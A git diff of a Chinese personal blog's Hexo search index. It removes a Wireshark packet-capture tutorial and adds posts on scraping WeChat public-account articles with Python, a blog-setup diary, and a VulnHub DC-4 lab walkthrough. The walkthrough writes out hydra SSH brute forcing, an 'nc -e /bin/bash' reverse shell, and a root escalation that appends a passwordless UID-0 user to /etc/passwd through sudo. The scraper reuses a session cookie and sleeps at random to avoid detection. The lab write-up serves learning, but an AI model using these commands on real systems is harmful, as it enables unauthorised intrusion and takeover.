UDP协议适用于无须应答、要求时效的软件使用，这样的设计正好与QQ追求的目标相符，所以QQ优先使用了此协议进行一切功能应用。但是，由于UDP协议具有不可靠性，常会因种种原因导致消息或数据的发送失败（很多时候会发现发送文件给对方接收时，对方根本收不到要求接收文件的消息。或是发送聊天消息时，对方根本没有收到过消息）。显然，UDP协议由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。QQ在数据传输上更注重实际性能，为了获得更好的使用效果，往往可以牺牲一定的可靠性。因此，使用QQ来传输数据，在很多时候就成了一个“不错”的选择。（来自互联网）</p>
-              </div>
-            </details>
-<h1>测试环境：</h1>
-<p>将手机与电脑连接至同一局域网中。</p>
-<ul>
-<li>
-<p>手机IP:<code>192.168.31.216</code></p>
-<p><img src="https://img.anineg.space/3454545.png" alt="Screenshot_20221004_140105"></p>
-</li>
-<li>
-<p>电脑IP:<code>192.168.31.182</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004140012.png" alt="QQ截图20221004140012"></p>
-</li>
-</ul>
-<h1>Wireshark抓包</h1>
-<p>启动WireShark，选择WLAN过滤器：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004132831.png" alt="QQ截图20221004132831"></p>
-<p>在过滤器中输入：<code>ip.src == 192.168.31.216</code>以捕获/过滤指定ip地址（手机）数据包。</p>
-<p><img src="https://img.anineg.space/12345664556.png" alt="12345664556"></p>
-<p>此时，我们在手机上发送一张图片给电脑，我们可以看到Wireshark捕获了大量数据包。其中这一项就是我们刚刚发送的图片：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135150.png" alt="QQ截图20221004135150"></p>
-<p>右键，选择“追踪流=&gt;TCP流”</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135442.png" alt="QQ截图20221004135442"></p>
-<p>数据格式选择“原始数据”，然后将其另存为新文件。</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135514.png" alt="QQ截图20221004135514"></p>
-<h1>数据还原</h1>
-<p>使用16进制编辑器（如WinHex）打开文件，找到jpg格式图片的文件头<code>FF D8 FF</code>,并把文件头前面的数据删除：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135748.png" alt="QQ截图20221004135748"></p>
-<p>保存后，将文件后缀改为<code>.jpg</code>，至此，文件得以还原：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135901.png" alt="QQ截图20221004135901"></p>
-<div class="tag link"><a class="link-card" title="文件头标识及对应类型表" href="https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表："><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">文件头标识及对应类型表</p><p class="url">https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表：</p></div></a></div>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>Wireshark</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PE启动盘的制作</title>
     <url>/2022/03/12/pe/</url>
     <content><![CDATA[<h1>下载制作工具</h1>
@@ -1265,6 +1043,118 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       </categories>
   </entry>
   <entry>
+    <title>Python网络爬虫之微信公众号（待改进）</title>
+    <url>/2023/05/31/pypachong/</url>
+    <content><![CDATA[<h1>前言</h1>
+<p>近日得到一任务：需要爬取某个公众号的文章并保存到本地，然后进行分析。那么对于公众号爬取确实是比较少见而且有点难度，在搜集资料后，结合网络文章的经验以及自己的改进，实现了这一功能。参考文章会在文末列出。</p>
+<h1>准备</h1>
+<ul>
+<li>Python环境</li>
+<li>电脑或是服务器</li>
+<li>一个自己能登陆的微信公众号</li>
+</ul>
+<h1>批量获取公众号推送链接</h1>
+<p>由于公众号的每一篇文章的链接似乎是随机生成的，相互之间没有关联，因此要批量获取某公众号的文章链接需要用到一定的方法，搜狗微信只能获取到最近的几篇文章，并不能做到全部收录。这里就需要用到自己的微信公众号的后台了。</p>
+<p>登录<a href="https://mp.weixin.qq.com/">微信公众平台</a>，新建文章，点击超链接。此时打开浏览器的检查模式，选择<code>网络(Network)</code>，然后在窗口中选择你要爬取的公众号。</p>
+<h2 id="获取fakeid和token">获取fakeid和token</h2>
+<p><img src="https://img.anineg.space/pypachong1.png" alt=""></p>
+<p>这时我们可以看到，<code>网络</code>中出现了一个“<code>appmsg</code>”开头的内容，这就是我们需要的目标。将它的请求URL记录在下面（*隐去了部分内容）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://mp.weixin.qq.com/cgi-bin/appmsg?action=list_ex&amp;begin=0&amp;count=5&amp;fakeid=MzI2********Mw==&amp;type=9&amp;query=&amp;token=465***914lang=zh_CN&amp;f=json&amp;ajax=1</span><br></pre></td></tr></tbody></table></figure>
+<p>该链接分为三部分：</p>
+<ol>
+<li><code>https://mp.weixin.qq.com/cgi-bin/appmsg</code> 请求的基础部分</li>
+<li><code>?action=list_ex</code> 常用于动态网站，实现不同的参数值而生成不同的页面或者返回不同的结果</li>
+<li><code>&amp;begin=0&amp;count=5&amp;fakeid=MzI2MTE0NTE3Mw==&amp;type=9&amp;query=&amp;token=465219914&amp;lang=zh_CN&amp;f=json&amp;ajax=1</code> 设置各种参数，我们需要的就是用到这里的<code>fakeid=MzI2********Mw==</code>以及token=465***914</li>
+</ol>
+<h2 id="获取浏览器Cookie和User-Agent">获取浏览器Cookie和User-Agent</h2>
+<p>在python运行时，我们需要它能以登录的状态去访问该URL。因此需要找到我们浏览器保存的Cookie和User-Agent：</p>
+<p>开浏览器的检查模式，选择<code>文档(Document)</code>。此时刷新网页，就可以看到一个“<code>home</code>”开头的内容：</p>
+<p><img src="https://img.anineg.space/pypachong3.png" alt=""></p>
+<p>从这里我们可以获得Cookie和User-Agent参数。</p>
+<p><img src="https://img.anineg.space/pypachong4.png" alt=""></p>
+<h2 id="保存为yaml文件方便加载">保存为yaml文件方便加载</h2>
+<p>将上述四个参数保存至一个<code>wechat.yaml</code>文件中，方便后面在python中加载。</p>
+<p>文件内容：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cookie : RK=P/Pd1qTtZk; ptcz......</span><br><span class="line">user_agent : Mozilla/5.0......</span><br><span class="line">fakeid : MzI2.......</span><br><span class="line">token : 2023483153......</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="URL爬取">URL爬取</h2>
+<p>这部分主要参考了<a href="https://zhuanlan.zhihu.com/p/379062852">@Author:YuFanWenShu</a>的代码：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#加载参数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"wechat.yaml"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> file: <span class="comment">#将上文的wechat.yaml放在同一文件夹</span></span><br><span class="line">    file_data = file.read()</span><br><span class="line">config = yaml.safe_load(file_data)</span><br><span class="line"></span><br><span class="line">headers = {</span><br><span class="line">    <span class="string">"Cookie"</span>: config[<span class="string">'cookie'</span>],</span><br><span class="line">    <span class="string">"User-Agent"</span>: config[<span class="string">'user_agent'</span>]</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求参数</span></span><br><span class="line">url = <span class="string">"https://mp.weixin.qq.com/cgi-bin/appmsg"</span></span><br><span class="line">begin = <span class="string">"0"</span></span><br><span class="line">params = {</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"list_ex"</span>,</span><br><span class="line">    <span class="string">"begin"</span>: begin,</span><br><span class="line">    <span class="string">"count"</span>: <span class="string">"5"</span>,</span><br><span class="line">    <span class="string">"fakeid"</span>: config[<span class="string">'fakeid'</span>],</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"9"</span>,</span><br><span class="line">    <span class="string">"token"</span>: config[<span class="string">'token'</span>],</span><br><span class="line">    <span class="string">"lang"</span>: <span class="string">"zh_CN"</span>,</span><br><span class="line">    <span class="string">"f"</span>: <span class="string">"json"</span>,</span><br><span class="line">    <span class="string">"ajax"</span>: <span class="string">"1"</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存放结果</span></span><br><span class="line">app_msg_list = []</span><br><span class="line"><span class="comment"># 在不知道公众号有多少文章的情况下，使用while语句</span></span><br><span class="line"><span class="comment"># 也方便重新运行时设置页数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"app_msg_list.csv"</span>, <span class="string">"w"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">"文章标识符aid,标题title,链接url,时间time\n"</span>)</span><br><span class="line">page = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    begin = page * <span class="number">5</span></span><br><span class="line">    params[<span class="string">"begin"</span>] = <span class="built_in">str</span>(begin)</span><br><span class="line">    <span class="comment"># 随机暂停几秒，避免过快的请求导致过快的被查到</span></span><br><span class="line">    time.sleep(random.randint(<span class="number">1</span>, <span class="number">10</span>))</span><br><span class="line">    resp = requests.get(url, headers=headers, params=params, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 微信流量控制, 退出</span></span><br><span class="line">    <span class="keyword">if</span> resp.json()[<span class="string">'base_resp'</span>][<span class="string">'ret'</span>] == <span class="number">200013</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"frequencey control, stop at {}"</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(begin)))</span><br><span class="line">        time.sleep(<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果返回的内容中为空则结束</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(resp.json()[<span class="string">'app_msg_list'</span>]) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"all ariticle parsed"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    msg = resp.json()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"app_msg_list"</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> msg[<span class="string">"app_msg_list"</span>]:</span><br><span class="line">            info = <span class="string">'"{}","{}","{}","{}"'</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(item[<span class="string">"aid"</span>]), item[<span class="string">'title'</span>], item[<span class="string">'link'</span>], <span class="built_in">str</span>(item[<span class="string">'create_time'</span>]))</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"app_msg_list.csv"</span>, <span class="string">"a"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(info + <span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"第<span class="subst">{page}</span>页爬取成功\n"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n"</span>.join(info.split(<span class="string">","</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n\n---------------------------------------------------------------------------------\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 翻页</span></span><br><span class="line">    page += <span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+<p>经测试，每爬取大约200篇文章会遇到流量限制，此时需要等待一小时左右。一个账号一天最多只能爬取1000篇左右，我在这里测试的时候，是在大约1200篇的时候停下了，可能需要一天甚至更长的时间才能继续…</p>
+<h1>将爬取的文章批量下载至本地（待改进）</h1>
+<p>使用<code>pdfkit</code>将文章转为PDF，可能需要安装：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pip install pdfkit</span><br><span class="line">pip install bs4</span><br><span class="line">pip install html5lib</span><br></pre></td></tr></tbody></table></figure>
+<p>还需要安装一个工具：<a href="https://wkhtmltopdf.org/downloads.html">wkhtmltopdf下载链接</a></p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选项</span></span><br><span class="line">options = {</span><br><span class="line">    <span class="string">'page-size'</span>: <span class="string">'A4'</span>,</span><br><span class="line">    <span class="comment">#     'margin-top': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-right': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-bottom': '0.75in',</span></span><br><span class="line">    <span class="comment">#     'margin-left': '0.75in',</span></span><br><span class="line">    <span class="string">'encoding'</span>: <span class="string">"UTF-8"</span>,</span><br><span class="line">    <span class="comment"># "enable-local-file-access": True,</span></span><br><span class="line">    <span class="comment">#      'custom-header': headers,</span></span><br><span class="line">    <span class="comment">#     'debug-javascript': [''],</span></span><br><span class="line">    <span class="comment">#     'javascript-delay': 10000,</span></span><br><span class="line">    <span class="comment">#     'no-stop-slow-scripts': "",</span></span><br><span class="line">    <span class="comment">#     'load-media-error-handling': 'abort',</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">path_wkthmltopdf = <span class="string">r'C:\Program Files\wkhtmltopdf\bin\wkhtmltopdf.exe'</span></span><br><span class="line">config = pdfkit.configuration(wkhtmltopdf=path_wkthmltopdf)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换特殊字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_title</span>(<span class="params">title</span>):</span><br><span class="line">    rstr = <span class="string">r"[\/\\\:\*\?\"\&lt;\&gt;\|]"</span>  <span class="comment"># '/ \ : * ? " &lt; &gt; |'</span></span><br><span class="line">    new_title = re.sub(rstr, <span class="string">"_"</span>, title)  <span class="comment"># 替换为下划线</span></span><br><span class="line">    new_title = new_title.replace(<span class="string">'：'</span>, <span class="string">' _'</span>)</span><br><span class="line">    new_title = new_title.replace(<span class="string">'？'</span>, <span class="string">'_'</span>)</span><br><span class="line">    <span class="keyword">return</span> new_title</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"D:\\turn-to-pdf\\app_msg_list.csv"</span>, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    <span class="comment"># next(reader)  # 跳过CSV文件的表头行</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        aid, title, url, time = row</span><br><span class="line">        <span class="keyword">if</span> url.find(<span class="string">'mp.weixin.qq.com'</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'此内容发送失败无法查看'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># data-src替换为src 有时候返回的正文被隐藏了，将hidden去掉</span></span><br><span class="line">            html = res.text.replace(<span class="string">"data-src"</span>, <span class="string">"src"</span>).replace(<span class="string">'style="visibility: hidden;"'</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">            soup = BeautifulSoup(html, features=<span class="string">"html5lib"</span>)</span><br><span class="line">            <span class="comment"># 选择正文（去除javascrapt等）</span></span><br><span class="line">            html = soup.select(<span class="string">'div#img-content'</span>)[<span class="number">0</span>]</span><br><span class="line">            html = <span class="built_in">str</span>(html).replace(<span class="string">"font-family: 仿宋;"</span>, <span class="string">""</span>)</span><br><span class="line">            output = title + <span class="string">'.pdf'</span></span><br><span class="line">            pdfkit.from_string(<span class="built_in">str</span>(html), output, configuration=config, options=options)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"<span class="subst">{i}</span>:<span class="subst">{title}</span> 已完成"</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"Skipping <span class="subst">{url}</span> because it's not from WeChat."</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>这一步有很多奇怪的问题，比如如果原文中有仿宋字体的话，在转成PDF后全部都不能正常显示。于是在转为PDF之前将HTML中的所有仿宋全部替换为默认字体。</p>
+<p><img src="https://img.anineg.space/pypachong5.png" alt=""></p>
+<p>这一部分还有诸多问题没有解决，但目前小部分的转换应该没有太大问题。偶尔还会遇到一些报错，暂时也还没有解决。如果各位大佬有办法，欢迎在评论区留言！</p>
+<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
+              <div class="content">
+              <div class="tag link"><a class="link-card" title="用Python爬取指定公众号所有文章" href="https://zhuanlan.zhihu.com/p/379062852"><div class="left"><img src="https://img.anineg.space/zhihu.jpg"></div><div class="right"><p class="text">用Python爬取指定公众号所有文章</p><p class="url">https://zhuanlan.zhihu.com/p/379062852</p></div></a></div><div class="tag link"><a class="link-card" title="【Python】将微信收藏的文章批量导出为pdf" href="https://blog.csdn.net/qq_32832803/article/details/122508085"><div class="left"><img src="https://img.anineg.space/csdn.png"></div><div class="right"><p class="text">【Python】将微信收藏的文章批量导出为pdf</p><p class="url">https://blog.csdn.net/qq_32832803/article/details/122508085</p></div></a></div>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>分享会</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>个人博客入坑实录</title>
+    <url>/2022/01/12/start/</url>
+    <content><![CDATA[<h3 id="🏃‍♂️这是一个强迫症建设网站的辛酸历程"><s>🏃‍♂️这是一个强迫症建设网站的辛酸历程</s></h3>
+<h3 id="👨‍🦽这是一段令人心酸的网站建设历程">👨‍🦽这是一段令人心酸的网站建设历程</h3>
+<hr>
+<h1>✏第一天：2022.1.11</h1>
+<p>放假在家n天，闲来无事，恰巧<a href="https://cgrona.top/">风清竹喧</a>同学在建个人博客，便决心一起入坑。经过几十分钟的研究，解决了域名注册以及GitHub仓库的建设。当天晚上，临时使用了GitHub自带的主题模板：</p>
+<p><img src="https://s2.loli.net/2022/01/17/QkuBvtf36zNTUY8.png" alt="202201161728985" title="初始界面"></p>
+<p>没错…</p>
+<p>它很丑，而且自由度可玩性很低，至少不是我能接受的结果。</p>
+<p>参考文章：<a href="https://sspai.com/post/54608">GitHub Pages 搭建教程</a></p>
+<hr>
+<h1>✏第二天：2022.1.12</h1>
+<p>在经过了解相关知识后，最终决定采用Hexo + GitHub 的方式来搭建免费个人博客网站。</p>
+<p>不做详细介绍，简单叙述下：</p>
+<h3 id="GitHub-Pages-是什么？"><strong>GitHub Pages 是什么？</strong></h3>
+<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
+<h3 id="Hexo-是什么？"><strong>Hexo 是什么？</strong></h3>
+<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
+<h3 id="Hexo-GitHub-文章发布原理"><strong>Hexo + GitHub 文章发布原理</strong></h3>
+<p>在本地撰写 Markdown 格式文章后，通过 Hexo 解析文档，渲染生成具有主题样式的 HTML 静态网页，再推送到 GitHub 上完成博文的发布。</p>
+<h3 id="优点和不足"><strong>优点和不足</strong></h3>
+<p>优点：完全免费；静态站点，轻量快速；可按需求自由定制改造；托管在 GitHub，安全省心；迁移方便……</p>
+<p>不足：发文不便，依赖于本地环境；更适合个人博客使用；GitHub 在国内访问速度有点不快。（但实际上速度还是可以接受的，除了图片，真的很慢，建议将图片放图床，后面会讲到）</p>
+<p>一切都搞定后，它大概是长这个样子的⬇⬇⬇</p>
+<p><img src="https://s2.loli.net/2022/01/17/DjrMYknOSEcyzQu.jpg" alt="202201161921239"></p>
+<p>比昨天的好看多了！但是还是没有让人那么满意…</p>
+<p>参考文章：<a href="https://zhuanlan.zhihu.com/p/60578464">使用 Hexo+GitHub 搭建个人免费博客教程（小白向）</a></p>
+<hr>
+<h1>✏第三，四天：2022.1.13-14</h1>
+<p>后来经了解，发现了原来hexo是有很多主题可以用的，在这个时候我选择了Next主题来升级我的页面。</p>
+<p>整个过程不算难，跟着教程来一步步地很快就完成了。但最大的问题出在了后期的美化上。我使用的Next是8.9.0的版本，而网上大多数教程都是7.x甚至6.x的版本。据说在7.5后Next的文件结构是做了一些改动的，有人称它为“移除了custom文件的神奇跨时代版本”，这一点我在实际操作的时候真的是感同身受…</p>
+<p>但困难总比办法多嘛，在我的不懈努力之下，我发现了一位大佬的博客，其中里面详细叙述了各种文件改动以及解决方法，最终花了大概两天的时间，我的博客终于变成了我想要的样子：</p>
+<p><img src="https://s2.loli.net/2022/01/17/n7Z1Q2cCpVgai9w.jpg" alt="202201161953425"></p>
+<p>除了应用网上的各种教程以外，还可以去好好研究研究主题配置文件，使用 hexo s 命令一边改一边看效果，往往会有意想不到的效果。因为主题的版本越高，它往往内置的插件越多，所以很多东西并不需要去 npm install 的。</p>
+<p>参考文章：</p>
+<p>​	<a href="http://theme-next.iissnan.com/getting-started.html">安装 NexT</a></p>
+<p>​	<a href="https://blog.csdn.net/Growing_potato/article/details/113926856">next主题美化</a></p>
+<p>​	<a href="https://blog.csdn.net/C_acgl/article/details/86555826">Hexo优化</a></p>
+<p>​	<a href="https://www.jianshu.com/p/f054333ac9e6">打造炫酷网站</a></p>
+<p>​	<a href="https://zhuanlan.zhihu.com/p/251383216">next8.0主题美化</a></p>
+<p>​	<a href="https://tding.top/archives/2bd6d82.html">大佬的文章</a></p>
+<p>​	<a href="https://hexo-next.readthedocs.io/zh_CN/latest/">Hexo-NexT说明书</a></p>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件上传漏洞</title>
     <url>/2022/03/25/upload/</url>
     <content><![CDATA[<h1>什么是文件上传漏洞</h1>
@@ -1280,6 +1170,211 @@ hexo clean            # 清除缓存和已生成的静态文件</p>
       <categories>
         <category>学习笔记</category>
       </categories>
+  </entry>
+  <entry>
+    <title>VulnHub——DC-4靶机学习记录</title>
+    <url>/2022/07/25/dc4/</url>
+    <content><![CDATA[<h1>关于DC-4</h1>
+<blockquote>
+<p>DC-4是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
+<p>与以前的DC版本不同，此版本主要为初学者/中级版本而设计。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p>
+<p>Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。</p>
+<p>对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>DC- 4</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>发布日期</td>
+<td>2019年4月7日</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>DCAU</td>
+</tr>
+<tr>
+<td>系列</td>
+<td>DC</td>
+</tr>
+<tr>
+<td>网页</td>
+<td><a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></td>
+</tr>
+</tbody>
+</table>
+<h1>环境</h1>
+<p>靶机：DC-4（IP:未知）</p>
+<p>攻击机：KALI（IP:192.168.3.96）</p>
+<p>平台：VMware 16.2.4</p>
+<h1>信息收集</h1>
+<p><strong>主机发现</strong></p>
+<p><code>arp-scan -l</code></p>
+<p><img src="https://img.anineg.space/scan1.png" alt="scan1"></p>
+<p><strong>使用nmap进行扫描主机</strong></p>
+<p><code>nmap -sS -Pn -A -p- -n 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/nmapss.png" alt="nmapss"></p>
+<p><code>nmap -sV -p- 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/nmapsv.png" alt="nmapsv"></p>
+<p><strong>web指纹识别</strong></p>
+<p><code>whatweb -v 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/whatweb.png" alt="whatweb"></p>
+<p><strong>网站目录扫描</strong></p>
+<p><code>dirb http://192.168.3.95 /usr/share/dirb/wordlists/big.txt</code></p>
+<p><img src="https://img.anineg.space/dirb.png" alt="dirb"></p>
+<h2 id="收集到的信息：">收集到的信息：</h2>
+<ul>
+<li>
+<p>靶机IP =&gt; 192.168.3.95</p>
+</li>
+<li>
+<p>开放的端口：</p>
+<ul>
+<li>22 =&gt; ssh服务 ---- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
+<li>80 =&gt; http服务 ---- nginx 1.15.10</li>
+</ul>
+<hr>
+</li>
+</ul>
+<h1>渗透测试</h1>
+<p>尝试用hydra进行爆破</p>
+<p><code>hydra -l root -P /root/top1000.txt -vV -t 10 -o ssh.txt 192.168.15.152 ssh -s 22</code></p>
+<p><img src="https://img.anineg.space/hydra1.png" alt="hydra1"></p>
+<p>爆不出来，先去网页端看一看有什么有用的信息。</p>
+<p>访问<code>http://192.168.3.95/</code></p>
+<p><img src="https://img.anineg.space/0010.png" alt="0010"></p>
+<p>打开网页，是一个登录界面，开始用BP进行爆破，得到密码：</p>
+<blockquote>
+<p>happy</p>
+</blockquote>
+<p><img src="https://img.anineg.space/baopo.png" alt="baopo"></p>
+<p>登录进入，发现有可以执行命令的地方：</p>
+<p><img src="https://img.anineg.space/login.png" alt="login"></p>
+<p><img src="https://img.anineg.space/run.png" alt="run"></p>
+<p>使用BP进行抓包，发现可以修改命令：</p>
+<p><img src="https://img.anineg.space/bp1.png" alt="bp1"></p>
+<p><img src="https://img.anineg.space/bp2.png" alt="bp2"></p>
+<p><img src="https://img.anineg.space/fire1.png" alt="fire1"></p>
+<p>先执行一个反弹shell的命令：<code>nc -e /bin/bash 192.168.3.95 4444</code></p>
+<p>执行之前现在kali上监听4444端口：<code>nc -lnvp 4444</code></p>
+<p><img src="https://img.anineg.space/listen.png" alt="listen"></p>
+<p><img src="https://img.anineg.space/bp4.png" alt="bp4"></p>
+<p>getshell成功：</p>
+<p><img src="https://img.anineg.space/ncsuccess.png" alt="ncsuccess"></p>
+<p>进入交互模式，便于操作：<code>python -c 'import pty;pty.spawn("/bin/sh")'</code></p>
+<p>先搜刮一下目录：</p>
+<p><img src="https://img.anineg.space/jim.png" alt="jim"></p>
+<p>查看jim用户下的backups，发现确实是密码的备份，cat打开进行查看，确实是密码。</p>
+<p><img src="https://img.anineg.space/bak.png" alt="bak"></p>
+<p>看看其他文件，mbox访问被拒绝：</p>
+<p><img src="https://img.anineg.space/catother.png" alt="catother"></p>
+<p>把密码copy到本地，用 hydra进行爆破：</p>
+<p><code>hydra -l jim -P /home/kali/桌面/bak.txt ssh://192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/hydrasuccess.png" alt="hydrasuccess"></p>
+<p>得到密码：</p>
+<blockquote>
+<p>jibril04</p>
+</blockquote>
+<p>使用ssh远程登陆：</p>
+<p><img src="https://img.anineg.space/sshin1.jpg" alt="sshin1"></p>
+<p>注意系统提示有新的邮件。</p>
+<p>找到邮件，发现 charles用户交给 jim用户保管的密码：</p>
+<p><img src="https://img.anineg.space/cdmail.png" alt="cdmail"></p>
+<p><img src="https://img.anineg.space/jimmail.png" alt="jimmail"></p>
+<p>得到用户名和密码：</p>
+<blockquote>
+<p>charles</p>
+<p>^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>再次使用ssh远程登陆到charles ：</p>
+<p><img src="https://img.anineg.space/sshin2.png" alt="sshin2"></p>
+<p>查看用户权限发现，该用户可以以root权限免密码执行 /usr/bin/teehee</p>
+<p>进行提权，直接向/etc/passwd中增加内容：</p>
+<p>echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
+<p>添加一个 hack用户，并使用teehee执行写入passwd中</p>
+<p><code>echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd</code></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">参数解释：</span><br><span class="line">admin:x:0:0::/home/admin:/bin/bash</span><br><span class="line">[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span><br><span class="line">"-a" 选项的作用等同于 "&gt;&gt;" 命令</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://img.anineg.space/image-20220725223345603.png" alt="image-20220725223345603"></p>
+<p>得到flag：<img src="https://img.anineg.space/flag.png" alt="flag"></p>
+<details class="folding-tag" cyan="" close=""><summary> 参考文章： </summary>
+              <div class="content">
